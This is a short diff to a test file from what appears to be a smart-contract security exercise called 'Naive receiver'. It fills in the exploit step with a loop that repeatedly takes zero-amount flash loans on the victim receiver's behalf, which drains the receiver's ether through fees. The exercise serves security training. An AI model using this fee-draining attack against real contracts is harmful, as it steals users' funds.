@@ -31,6 +31,14 @@ describe('[Challenge] Naive receiver', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */   
+
+        // anyone can call NaiveReceiverLenderPool.flashLoan for other (borrower parameter...?)
+
+        // keep drain untill no enough fee
+        let fee = await this.pool.fixedFee();
+        for(let i = 0; i < ETHER_IN_RECEIVER / fee; i++){
+            await this.pool.connect(attacker).flashLoan(this.receiver.address, 0);
+        }
     });
 
     after(async function () {
